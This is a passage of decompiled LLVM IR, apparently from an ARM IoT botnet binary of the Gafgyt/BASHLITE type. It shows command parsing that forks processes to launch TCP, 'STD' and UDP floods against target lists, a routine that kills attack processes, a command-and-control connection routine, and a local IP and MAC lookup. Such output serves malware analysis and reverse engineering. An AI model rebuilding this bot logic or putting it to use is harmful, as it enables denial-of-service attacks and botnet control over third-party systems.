  %v2_ddc0 = load i32, i32* %v1_ddc0, align 4
  %v2_ddd0 = load i32, i32* %v1_dcf0, align 4
  store i32 %v2_ddd0, i32* @r0, align 4
  %v1_ddd8 = call i32 @atol(i32 %v2_ddd0)
  %v2_ddec = load i32, i32* %v1_dcd0, align 4
  store i32 %v2_ddec, i32* @r0, align 4
  %v1_ddf4 = call i32 @atol(i32 %v2_ddec)
  %v2_de08 = load i32, i32* %v1_dd10, align 4
  store i32 %v2_de08, i32* @r0, align 4
  %v1_de10 = call i32 @atol(i32 %v2_de08)
  %v1_de20 = add i32 %tmp, 20
  %v1_de24 = inttoptr i32 %v1_de20 to i32*
  %v2_de24 = load i32, i32* %v1_de24, align 4
  br i1 %v7_dd78, label %dec_label_pc_de38, label %dec_label_pc_de54

dec_label_pc_de38:                                ; preds = %dec_label_pc_ddb8
  %v1_de3c = add i32 %tmp, 28
  %v1_de40 = inttoptr i32 %v1_de3c to i32*
  %v2_de40 = load i32, i32* %v1_de40, align 4
  store i32 %v2_de40, i32* @r0, align 4
  %v1_de48 = call i32 @atol(i32 %v2_de40)
  br label %dec_label_pc_de5c

dec_label_pc_de54:                                ; preds = %dec_label_pc_ddb8
  br label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de38, %dec_label_pc_de54
  %storemerge5 = phi i32 [ 10, %dec_label_pc_de54 ], [ %v1_de48, %dec_label_pc_de38 ]
  br i1 %v7_dd50, label %dec_label_pc_de8c, label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de5c
  %v1_de74 = add i32 %tmp, 24
  %v1_de78 = inttoptr i32 %v1_de74 to i32*
  %v2_de78 = load i32, i32* %v1_de78, align 4
  store i32 %v2_de78, i32* @r0, align 4
  %v1_de80 = call i32 @atol(i32 %v2_de78)
  br label %dec_label_pc_de94

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de5c
  br label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de8c
  %storemerge4 = phi i32 [ 0, %dec_label_pc_de8c ], [ %v1_de80, %dec_label_pc_de70 ]
  store i32 %v2_ddc0, i32* @r0, align 4
  %v2_dea8 = call i32 @__GI_strchr(i32 %v2_ddc0, i32 44)
  store i32 %v2_dea8, i32* @r0, align 4
  %v2_deb0 = icmp eq i32 %v2_dea8, 0
  br i1 %v2_deb0, label %dec_label_pc_df3c, label %dec_label_pc_deb8

dec_label_pc_deb8:                                ; preds = %dec_label_pc_de94
  %v2_dec4 = call i32 @__GI_strtok(i32 %v2_ddc0, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_dec4, i32* @r0, align 4
  %v2_df3021 = icmp eq i32 %v2_dec4, 0
  br i1 %v2_df3021, label %dec_label_pc_df80, label %dec_label_pc_ded4

dec_label_pc_ded4:                                ; preds = %dec_label_pc_deb8, %dec_label_pc_df18
  %storemerge1322 = phi i32 [ %v2_df20, %dec_label_pc_df18 ], [ %v2_dec4, %dec_label_pc_deb8 ]
  %v0_ded4 = call i32 @listFork()
  %v2_dedc = icmp eq i32 %v0_ded4, 0
  br i1 %v2_dedc, label %dec_label_pc_dee4, label %dec_label_pc_df18

dec_label_pc_dee4:                                ; preds = %dec_label_pc_ded4
  %v7_df0c = call i32 @sendTCP(i32 %storemerge1322, i32 %v1_ddd8, i32 %v1_ddf4, i32 %v1_de10, i32 %v2_de24, i32 %storemerge4, i32 %storemerge5)
  %v1_df14 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_df18

dec_label_pc_df18:                                ; preds = %dec_label_pc_ded4, %dec_label_pc_dee4
  %v2_df20 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_df20, i32* @r0, align 4
  %v2_df30 = icmp eq i32 %v2_df20, 0
  br i1 %v2_df30, label %dec_label_pc_df80, label %dec_label_pc_ded4

dec_label_pc_df3c:                                ; preds = %dec_label_pc_de94
  %v0_df3c = call i32 @listFork()
  %v2_df44 = icmp eq i32 %v0_df3c, 0
  br i1 %v2_df44, label %dec_label_pc_df4c, label %dec_label_pc_df80

dec_label_pc_df4c:                                ; preds = %dec_label_pc_df3c
  %v7_df74 = call i32 @sendTCP(i32 %v2_ddc0, i32 %v1_ddd8, i32 %v1_ddf4, i32 %v1_de10, i32 %v2_de24, i32 %storemerge4, i32 %storemerge5)
  %v1_df7c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_df80

dec_label_pc_df80:                                ; preds = %dec_label_pc_df18, %dec_label_pc_deb8, %dec_label_pc_df3c, %dec_label_pc_dc9c, %dec_label_pc_df4c
  %v2_df84 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1d0ac.520 to i32), i32* @r1, align 4
  %v3_df90 = inttoptr i32 %v2_df84 to i8*
  %v4_df90 = call i32 @__GI_strcoll(i8* %v3_df90, i32 ptrtoint ([4 x i8]* @global_var_1d0ac.520 to i32))
  %v2_df98 = icmp eq i32 %v4_df90, 0
  br i1 %v2_df98, label %dec_label_pc_dfa0, label %dec_label_pc_e0f8

dec_label_pc_dfa0:                                ; preds = %dec_label_pc_df80
  %v7_dfa8 = icmp slt i32 %arg1, 4
  br i1 %v7_dfa8, label %dec_label_pc_dfec, label %dec_label_pc_dfac

dec_label_pc_dfac:                                ; preds = %dec_label_pc_dfa0
  %v1_dfb0 = add i32 %tmp, 8
  %v1_dfb4 = inttoptr i32 %v1_dfb0 to i32*
  %v2_dfb4 = load i32, i32* %v1_dfb4, align 4
  store i32 %v2_dfb4, i32* @r0, align 4
  %v1_dfbc = call i32 @atol(i32 %v2_dfb4)
  %tmp82 = icmp slt i32 %v1_dfbc, 1
  br i1 %tmp82, label %dec_label_pc_dfec, label %dec_label_pc_dfcc

dec_label_pc_dfcc:                                ; preds = %dec_label_pc_dfac
  %v1_dfd0 = add i32 %tmp, 12
  %v1_dfd4 = inttoptr i32 %v1_dfd0 to i32*
  %v2_dfd4 = load i32, i32* %v1_dfd4, align 4
  store i32 %v2_dfd4, i32* @r0, align 4
  %v1_dfdc = call i32 @atol(i32 %v2_dfd4)
  %v5_dfe8 = icmp sgt i32 %v1_dfdc, 0
  br i1 %v5_dfe8, label %dec_label_pc_e004, label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfcc, %dec_label_pc_dfac, %dec_label_pc_dfa0
  %v2_dff0 = load i32, i32* @global_var_27918.46, align 4
  %v3_dffc = call i32 @Rootsprintf(i32 %v2_dff0, i32 ptrtoint ([27 x i8]* @global_var_1d0b0.522 to i32))
  br label %dec_label_pc_e210

dec_label_pc_e004:                                ; preds = %dec_label_pc_dfcc
  %v1_e008 = add i32 %tmp, 4
  %v1_e00c = inttoptr i32 %v1_e008 to i32*
  %v2_e00c = load i32, i32* %v1_e00c, align 4
  %v2_e01c = load i32, i32* %v1_dfb4, align 4
  store i32 %v2_e01c, i32* @r0, align 4
  %v1_e024 = call i32 @atol(i32 %v2_e01c)
  %v2_e038 = load i32, i32* %v1_dfd4, align 4
  store i32 %v2_e038, i32* @r0, align 4
  %v1_e040 = call i32 @atol(i32 %v2_e038)
  store i32 %v2_e00c, i32* @r0, align 4
  %v2_e058 = call i32 @__GI_strchr(i32 %v2_e00c, i32 44)
  store i32 %v2_e058, i32* @r0, align 4
  %v2_e060 = icmp eq i32 %v2_e058, 0
  br i1 %v2_e060, label %dec_label_pc_e0d0, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %dec_label_pc_e004
  %v2_e074 = call i32 @__GI_strtok(i32 %v2_e00c, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_e074, i32* @r0, align 4
  %v2_e0c418 = icmp eq i32 %v2_e074, 0
  br i1 %v2_e0c418, label %dec_label_pc_e0f8, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %dec_label_pc_e068, %dec_label_pc_e0ac
  %storemerge1119 = phi i32 [ %v2_e0b4, %dec_label_pc_e0ac ], [ %v2_e074, %dec_label_pc_e068 ]
  %v0_e084 = call i32 @listFork()
  %v2_e08c = icmp eq i32 %v0_e084, 0
  br i1 %v2_e08c, label %dec_label_pc_e094, label %dec_label_pc_e0ac

dec_label_pc_e094:                                ; preds = %dec_label_pc_e084
  %v4_e0a0 = call i32 @sendSTD(i32 %storemerge1119, i32 %v1_e024, i32 %v1_e040, i32 0)
  %v1_e0a8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e0ac

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_e084, %dec_label_pc_e094
  %v2_e0b4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  store i32 %v2_e0b4, i32* @r0, align 4
  %v2_e0c4 = icmp eq i32 %v2_e0b4, 0
  br i1 %v2_e0c4, label %dec_label_pc_e0f8, label %dec_label_pc_e084

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e004
  %v0_e0d0 = call i32 @listFork()
  %v2_e0d8 = icmp eq i32 %v0_e0d0, 0
  br i1 %v2_e0d8, label %dec_label_pc_e0e0, label %dec_label_pc_e210

dec_label_pc_e0e0:                                ; preds = %dec_label_pc_e0d0
  %v4_e0ec = call i32 @sendSTD(i32 %v2_e00c, i32 %v1_e024, i32 %v1_e040, i32 0)
  %v1_e0f4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e0f8

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e0ac, %dec_label_pc_e068, %dec_label_pc_df80, %dec_label_pc_e0e0
  %v2_e0fc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1d0cc.524 to i32), i32* @r1, align 4
  %v3_e108 = inttoptr i32 %v2_e0fc to i8*
  %v4_e108 = call i32 @__GI_strcoll(i8* %v3_e108, i32 ptrtoint ([5 x i8]* @global_var_1d0cc.524 to i32))
  store i32 %v4_e108, i32* @r0, align 4
  %v2_e110 = icmp eq i32 %v4_e108, 0
  br i1 %v2_e110, label %dec_label_pc_e118, label %dec_label_pc_e210

dec_label_pc_e118:                                ; preds = %dec_label_pc_e0f8
  br label %dec_label_pc_e1bc

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e1bc, %dec_label_pc_e1f0
  %v3_e130 = mul i32 %storemerge9, 4
  %v2_e13c = load i32, i32* @global_var_2db88.67, align 4
  %v2_e140 = add i32 %v2_e13c, %v3_e130
  %v1_e144 = inttoptr i32 %v2_e140 to i32*
  %v2_e144 = load i32, i32* %v1_e144, align 4
  %v2_e148 = icmp eq i32 %v2_e144, 0
  br i1 %v2_e148, label %dec_label_pc_e1b0, label %dec_label_pc_e150

dec_label_pc_e150:                                ; preds = %dec_label_pc_e12c
  %v2_e168 = load i32, i32* %v1_e144, align 4
  %v0_e16c = call i32 @__GI_getpid()
  store i32 %v0_e16c, i32* @r0, align 4
  %v9_e174 = icmp eq i32 %v2_e168, %v0_e16c
  br i1 %v9_e174, label %dec_label_pc_e1b0, label %dec_label_pc_e17c

dec_label_pc_e17c:                                ; preds = %dec_label_pc_e150
  %v2_e18c = load i32, i32* @global_var_2db88.67, align 4
  %v2_e190 = add i32 %v2_e18c, %v3_e130
  %v1_e194 = inttoptr i32 %v2_e190 to i32*
  %v2_e194 = load i32, i32* %v1_e194, align 4
  %v2_e1a0 = call i32 @kill(i32 %v2_e194, i32 9)
  store i32 %v2_e1a0, i32* @r0, align 4
  %v1_e1a8 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e150, %dec_label_pc_e12c, %dec_label_pc_e17c
  %v1_e21827 = phi i32 [ %v1_e21828, %dec_label_pc_e12c ], [ %v0_e16c, %dec_label_pc_e150 ], [ %v2_e1a0, %dec_label_pc_e17c ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e12c ], [ %stack_var_-48.1, %dec_label_pc_e150 ], [ %v1_e1a8, %dec_label_pc_e17c ]
  %v1_e1b4 = add i32 %storemerge9, 1
  br label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e118, %dec_label_pc_e1b0
  %v1_e21828 = phi i32 [ 0, %dec_label_pc_e118 ], [ %v1_e21827, %dec_label_pc_e1b0 ]
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_e118 ], [ %stack_var_-48.0, %dec_label_pc_e1b0 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_e118 ], [ %v1_e1b4, %dec_label_pc_e1b0 ]
  %v5_e1d4 = load i32, i32* @global_var_27924.65, align 4
  %v9_e1e8 = icmp eq i32 %v5_e1d4, 0
  br i1 %v9_e1e8, label %dec_label_pc_e1f0, label %dec_label_pc_e12c

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e1bc
  %v2_e1d4 = load i32, i32* @global_var_27920.64, align 4
  %tmp84 = icmp ugt i32 %v2_e1d4, %storemerge9
  br i1 %tmp84, label %dec_label_pc_e12c, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_dc2c, %dec_label_pc_e1f0, %dec_label_pc_dbc4, %dec_label_pc_d7d8, %dec_label_pc_e0d0, %dec_label_pc_e0f8, %dec_label_pc_dc50, %dec_label_pc_d7fc, %dec_label_pc_d724, %dec_label_pc_d7b8, %dec_label_pc_d7ac, %dec_label_pc_d6bc, %dec_label_pc_dfec, %dec_label_pc_dda0, %dec_label_pc_da5c, %dec_label_pc_d75c, %dec_label_pc_d660
  %v1_e218 = phi i32 [ %v1_d7e8, %dec_label_pc_d7d8 ], [ %v0_e0d0, %dec_label_pc_e0d0 ], [ %v4_e108, %dec_label_pc_e0f8 ], [ %v0_dc50, %dec_label_pc_dc50 ], [ %v0_d7fc, %dec_label_pc_d7fc ], [ 0, %dec_label_pc_d724 ], [ %v1_d7c8, %dec_label_pc_d7b8 ], [ 0, %dec_label_pc_d7ac ], [ 0, %dec_label_pc_d6bc ], [ %v3_dffc, %dec_label_pc_dfec ], [ %v3_ddb0, %dec_label_pc_dda0 ], [ %v3_da6c, %dec_label_pc_da5c ], [ %v0_d734, %dec_label_pc_d75c ], [ %v3_d670, %dec_label_pc_d660 ], [ 0, %dec_label_pc_dbc4 ], [ %v1_e21828, %dec_label_pc_e1f0 ], [ 0, %dec_label_pc_dc2c ]
  store i32 %v3_d62c, i32* @r4, align 4
  store i32 %v6_d62c, i32* @r5, align 4
  store i32 %v9_d62c, i32* @r6, align 4
  store i32 %v12_d62c, i32* @r7, align 4
  store i32 %v15_d62c, i32* @r8, align 4
  store i32 %v18_d62c, i32* @fp, align 4
  ret i32 %v1_e218

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_e130, { 1, 0 }
  uselistorder i32 %v2_e0b4, { 2, 1, 0 }
  uselistorder i32 %v1_e040, { 1, 0 }
  uselistorder i32 %v1_e024, { 1, 0 }
  uselistorder i32 %v2_e00c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_df20, { 2, 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_de10, { 1, 0 }
  uselistorder i32 %v1_ddf4, { 1, 0 }
  uselistorder i32 %v1_ddd8, { 1, 0 }
  uselistorder i32 %v2_ddc0, { 1, 0, 3, 2 }
  uselistorder i32 %v2_dc34, { 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_dacc, { 1, 0 }
  uselistorder i32 %v1_dab0, { 1, 0 }
  uselistorder i32 %v1_da94, { 1, 0 }
  uselistorder i32 %v2_da7c, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1cef0.478 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_2db84.500, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1cba8.48 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_e210, { 1, 5, 4, 12, 13, 6, 0, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_e1bc, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e12c, { 1, 0 }
  uselistorder label %dec_label_pc_e0f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e0ac, { 1, 0 }
  uselistorder label %dec_label_pc_e084, { 1, 0 }
  uselistorder label %dec_label_pc_df80, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_df18, { 1, 0 }
  uselistorder label %dec_label_pc_ded4, { 1, 0 }
  uselistorder label %dec_label_pc_de94, { 1, 0 }
  uselistorder label %dec_label_pc_de5c, { 1, 0 }
  uselistorder label %dec_label_pc_ddb8, { 1, 0 }
  uselistorder label %dec_label_pc_dc9c, { 1, 0 }
  uselistorder label %dec_label_pc_dc2c, { 1, 0 }
  uselistorder label %dec_label_pc_dbe0, { 1, 0 }
  uselistorder label %dec_label_pc_dba0, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %dec_label_pc_db24, { 1, 0 }
  uselistorder label %dec_label_pc_da74, { 1, 0 }
  uselistorder label %dec_label_pc_d91c, { 1, 0 }
  uselistorder label %dec_label_pc_d78c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d700, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e270 = load i32, i32* @fp, align 4
  store i32 57976, i32* %stack_var_-4, align 4
  %v2_e274 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e274, i32* @fp, align 4
  %v2_e288 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e298 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e298 = call i32 @__GI_memset(i8* %v2_e298, i32 0)
  %v2_e2a0 = load i32, i32* @global_var_27918.46, align 4
  %v2_e2a4 = icmp eq i32 %v2_e2a0, 0
  br i1 %v2_e2a4, label %dec_label_pc_e2c8, label %dec_label_pc_e2ac

dec_label_pc_e2ac:                                ; preds = %entry
  %v1_e2b8 = call i32 @__GI_close(i32 %v2_e2a0)
  store i32 0, i32* @global_var_27918.46, align 4
  br label %dec_label_pc_e2c8

dec_label_pc_e2c8:                                ; preds = %entry, %dec_label_pc_e2ac
  %v2_e2cc = load i32, i32* @global_var_275f0.529, align 4
  %v2_e2d0 = icmp eq i32 %v2_e2cc, 0
  br i1 %v2_e2d0, label %dec_label_pc_e2fc, label %dec_label_pc_e2e8

dec_label_pc_e2e8:                                ; preds = %dec_label_pc_e2c8
  %v1_e2f0 = add i32 %v2_e2cc, 1
  br label %dec_label_pc_e2fc

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2c8, %dec_label_pc_e2e8
  %storemerge1 = phi i32 [ %v1_e2f0, %dec_label_pc_e2e8 ], [ 0, %dec_label_pc_e2c8 ]
  store i32 %storemerge1, i32* @global_var_275f0.529, align 4
  %v4_e314 = mul i32 %storemerge1, 4
  %v5_e314 = add i32 %v4_e314, ptrtoint ([20 x i8]** @global_var_269e4.531 to i32)
  %v6_e314 = inttoptr i32 %v5_e314 to i32*
  %v7_e314 = load i32, i32* %v6_e314, align 4
  store i32 %v7_e314, i32* @r1, align 4
  %v3_e320 = call i32 @strcpy(i8* %v2_e298, i32 %v7_e314)
  store i32 %v2_e288, i32* @r0, align 4
  %v2_e340 = call i32 @__GI_strchr(i32 %v2_e288, i32 58)
  %v2_e348 = icmp eq i32 %v2_e340, 0
  br i1 %v2_e348, label %dec_label_pc_e3a8, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e2fc
  store i32 %v2_e288, i32* @r0, align 4
  %v2_e364 = call i32 @__GI_strchr(i32 %v2_e288, i32 58)
  %v1_e36c = add i32 %v2_e364, 1
  store i32 %v1_e36c, i32* @r0, align 4
  %v1_e374 = call i32 @atol(i32 %v1_e36c)
  store i32 %v2_e288, i32* @r0, align 4
  %v2_e394 = call i32 @__GI_strchr(i32 %v2_e288, i32 58)
  %v3_e3a4 = inttoptr i32 %v2_e394 to i8*
  store i8 0, i8* %v3_e3a4, align 1
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e2fc, %dec_label_pc_e350
  %stack_var_-20.0 = phi i32 [ 123, %dec_label_pc_e2fc ], [ %v1_e374, %dec_label_pc_e350 ]
  %v3_e3b4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_e3b4, i32* @global_var_27918.46, align 4
  %v4_e3e8 = call i32 @connectTimeout(i32 %v3_e3b4, i32 %v2_e288, i32 %stack_var_-20.0, i32 30)
  %v2_e3f0 = icmp eq i32 %v4_e3e8, 0
  %. = zext i1 %v2_e3f0 to i32
  store i32 %v3_e270, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e288, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a8, { 1, 0 }
  uselistorder label %dec_label_pc_e2fc, { 1, 0 }
  uselistorder label %dec_label_pc_e2c8, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e43c = load i32, i32* @fp, align 4
  store i32 %v3_e43c, i32* %stack_var_-16, align 4
  %v3_e458 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_e468 = icmp eq i32 %v3_e458, -1
  br i1 %v3_e468, label %dec_label_pc_e470, label %dec_label_pc_e480

dec_label_pc_e470:                                ; preds = %entry
  br label %dec_label_pc_e6bc

dec_label_pc_e480:                                ; preds = %entry
  %v2_e480 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_e490 = bitcast i32* %stack_var_-52 to i8*
  %v3_e490 = call i32 @__GI_memset(i8* %v2_e490, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1d0d4.533 to i32), i32* @r0, align 4
  %v2_e4a0 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1d0d4.533 to i32))
  %v1_e4b0 = call i32 @__GI_htons(i32 53)
  %v3_e4cc = call i32 @__libc_connect(i32 %v3_e458, i32 %v2_e480, i32 16)
  %v3_e4dc = icmp eq i32 %v3_e4cc, -1
  br i1 %v3_e4dc, label %dec_label_pc_e4e4, label %dec_label_pc_e4f4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e480
  br label %dec_label_pc_e6bc

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e480
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e4fc = ptrtoint i32* %stack_var_-68 to i32
  %v2_e500 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e50c = call i32 @__GI_getsockname(i32 %v3_e458, i32 %v2_e4fc, i32 %v2_e500, i32 %v2_e4fc, i32 16)
  %v3_e51c = icmp eq i32 %v5_e50c, -1
  br i1 %v3_e51c, label %dec_label_pc_e524, label %dec_label_pc_e534

dec_label_pc_e524:                                ; preds = %dec_label_pc_e4f4
  br label %dec_label_pc_e6bc

dec_label_pc_e534:                                ; preds = %dec_label_pc_e4f4
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2db7c.80 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_2db7c.80, align 4
  %v3_e548 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_1d0dc.536 to i32), i32 0)
  %v2_e5e0 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e5d8

dec_label_pc_e558:                                ; preds = %dec_label_pc_e5d8
  %v8_e56c = call i32 @strstr(i32 %v2_e5e0, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1d0ec.538, i32 0, i32 0), i32 %v3_e548, i32 %v2_e5e0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e574 = icmp eq i32 %v8_e56c, 0
  br i1 %v2_e574, label %dec_label_pc_e5bc, label %dec_label_pc_e59c.preheader

dec_label_pc_e59c.preheader:                      ; preds = %dec_label_pc_e558
  %v2_e5a09 = load i8, i8* %stack_var_-4168, align 1
  %v7_e5a413 = icmp eq i8 %v2_e5a09, 9
  br i1 %v7_e5a413, label %dec_label_pc_e5ac, label %dec_label_pc_e590

dec_label_pc_e590:                                ; preds = %dec_label_pc_e59c.preheader, %dec_label_pc_e590
  %v4_e59c14 = phi i32 [ %v1_e594, %dec_label_pc_e590 ], [ %v2_e5e0, %dec_label_pc_e59c.preheader ]
  %v1_e594 = add i32 %v4_e59c14, 1
  %v5_e598 = inttoptr i32 %v1_e594 to i8*
  %v2_e5a0 = load i8, i8* %v5_e598, align 1
  %v7_e5a4 = icmp eq i8 %v2_e5a0, 9
  br i1 %v7_e5a4, label %dec_label_pc_e5ac, label %dec_label_pc_e590

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e590, %dec_label_pc_e59c.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e59c.preheader ], [ %v5_e598, %dec_label_pc_e590 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e600

dec_label_pc_e5bc:                                ; preds = %dec_label_pc_e558
  store i32 4096, i32* @r2, align 4
  %v3_e5d4 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e5d8

dec_label_pc_e5d8:                                ; preds = %dec_label_pc_e534, %dec_label_pc_e5bc
  %v4_e5f0 = call i32 @fdgets(i32 %v2_e5e0, i32 4096, i32 %v3_e548, i32 %v2_e5e0)
  %v2_e5f8 = icmp eq i32 %v4_e5f0, 0
  br i1 %v2_e5f8, label %dec_label_pc_e600, label %dec_label_pc_e558

dec_label_pc_e600:                                ; preds = %dec_label_pc_e5d8, %dec_label_pc_e5ac
  %v1_e604 = call i32 @__GI_close(i32 %v3_e548)
  %v4_e614 = load i8, i8* %stack_var_-4168, align 1
  %v2_e618 = icmp eq i8 %v4_e614, 0
  br i1 %v2_e618, label %dec_label_pc_e6b0, label %dec_label_pc_e620

dec_label_pc_e620:                                ; preds = %dec_label_pc_e600
  %v2_e628 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_e5e0, i32* @r1, align 4
  %v2_e640 = bitcast i32* %stack_var_-4200 to i8*
  %v3_e640 = call i32 @strcpy(i8* %v2_e640, i32 %v2_e5e0)
  store i32 %v2_e628, i32* @r3, align 4
  %v3_e660 = call i32 @ioctl(i32 %v3_e458, i32 35111, i32 %v2_e628)
  %v2_e680 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e670

dec_label_pc_e670:                                ; preds = %dec_label_pc_e620, %dec_label_pc_e670
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e620 ], [ %v1_e69c, %dec_label_pc_e670 ]
  store i32 %storemerge47, i32* @r1, align 4
  %v2_e688 = add i32 %storemerge47, %v2_e680
  %v1_e68c = inttoptr i32 %v2_e688 to i8*
  %v2_e68c = load i8, i8* %v1_e68c, align 1
  %v4_e694 = add i32 %storemerge47, ptrtoint (i32* @global_var_27928.540 to i32)
  %v5_e694 = inttoptr i32 %v4_e694 to i8*
  store i8 %v2_e68c, i8* %v5_e694, align 1
  %v1_e69c = add nuw nsw i32 %storemerge47, 1
  %v7_e6ac = icmp slt i32 %v1_e69c, 6
  br i1 %v7_e6ac, label %dec_label_pc_e670, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e670, %dec_label_pc_e600
  %v1_e6b4 = call i32 @__GI_close(i32 %v3_e458)
  %v3_e6d0.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e6cc

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e524, %dec_label_pc_e4e4, %dec_label_pc_e470
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e6b0, %dec_label_pc_e6bc
  %v3_e6d0 = phi i32 [ %v3_e6d0.pre, %dec_label_pc_e6b0 ], [ 0, %dec_label_pc_e6bc ]
  %v2_e6d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e6d8, i32* @fp, align 4
  ret i32 %v3_e6d0

; uselistorder directives
  uselistorder i32 %storemerge47, { 3, 1, 0, 2 }
